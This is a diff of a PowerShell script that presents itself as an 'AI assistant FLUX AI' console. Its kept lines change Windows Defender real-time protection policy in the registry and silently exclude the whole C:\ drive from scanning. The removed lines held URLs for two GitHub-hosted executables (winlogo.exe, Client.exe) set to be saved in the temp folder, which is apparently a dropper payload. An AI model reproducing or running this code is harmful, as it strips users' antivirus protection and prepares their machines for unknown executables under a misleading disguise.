@@ -18,10 +18,7 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 
 Write-Host "HI I AM AI ASSISTANT FLUX AI"
-$url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/winlogo.exe"
-$url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Client.exe"
-$path1 = "$env:TEMP\winlogo.exe"
-$path2 = "$env:TEMP\Client.exe"
+
 
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
@@ -36,7 +33,7 @@ $Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"
 
 
 function Show-KRAKEH-Header {
-    # Очищаем область заголовка
+    
     $headerArt = @"
                                          _.oo.
                  _.u[[/;:,.         .odMMMMMM'
@@ -44,7 +41,7 @@ function Show-KRAKEH-Header {
              oN88888UU[[[/;::-.
                dP^      dNMMNN888UU[[[/;:--.
           .o@P^            ,MMMMMMN888UU[[/;::-.
-       o@^            NNMMMNN888UU[[[/~.o@P^
+          o@^            NNMMMNN888UU[[[/~.o@P^
             888888888UU[[[/o@^-..
           oI8888UU[[[/o@P^:--..
        .@^  YUU[[[/o@^;::---..
